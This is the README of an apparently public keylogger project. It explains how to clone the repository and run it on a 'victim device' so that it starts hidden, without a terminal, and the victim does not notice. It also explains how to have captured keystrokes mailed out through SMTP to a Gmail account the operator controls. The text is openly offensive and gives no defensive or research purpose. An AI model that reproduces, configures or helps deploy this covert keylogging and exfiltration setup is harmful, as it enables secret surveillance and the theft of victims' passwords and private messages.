# Keylogger

## Install 

    git clone https://github.com/OldKokoroz/Keylogger.git


## Setup

To try on your device run Keylogger.py 

to run on your victim device run main.py it will install requirements and 
automatically run keylogger.pyw (without a terminal) so victim won't realize 


## Getting log file 

I used SMTP library in this project - change library in the mail function if you want 

You have to :

- open a new gmail account

 ---  mail_send("", "", log_msg)  ----

- enter your address instead of first ""

- enter your password instead of second ""

- It is set to send mails to the mail you give (that means you send logs to yourself with your account)
